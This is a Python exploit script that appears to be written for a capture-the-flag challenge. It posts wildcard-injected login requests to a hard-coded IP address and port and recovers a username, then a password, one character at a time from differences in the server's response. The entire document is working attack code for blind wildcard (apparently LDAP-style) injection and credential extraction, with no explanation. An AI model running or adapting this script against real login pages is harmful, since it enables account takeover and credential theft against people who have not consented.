from requests import post, get
import string
url = "http://206.189.25.173:32508/964430b4cdd199af19b986eaf2193b21f32542d0/search"
url2 = "http://206.189.25.173:32508/login"
chars = list("0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!\"#$%&'()+,-./:;<=>?@[\\]^_`{|}~")

result = ""

JSON = {
	"username": "",
	"password": "*"
}

temp = {
	"username": "",
	"password": "*"
}

otherTemp = {
	"username": "*",
	"password": ""
}

# Find the user.
run = True
while run:
	for i in chars:
		temp["username"] = result + i + "*"
		req = post(url2, temp)
		if 'No search results.' in req.text:
			result += i
			break

		if i == chars[-1]:
			JSON["username"] = temp["username"][:-2]
			usr = JSON["username"]
			print(f"User Name is: {usr}")
			run = False
			break
# resetting the result.
result = ""


run = True
# Find the password.
while run:
	for i in chars:
		otherTemp["password"] = result + i + "*"
		req = post(url2, otherTemp)
		if 'No search results.' in req.text:
			result += i
			break

		if i == chars[-1]:
			JSON["password"] = otherTemp["password"][:-2]
			pwd = JSON["password"]
			print(f"Pwd Name is: {pwd}")
			run = False
			break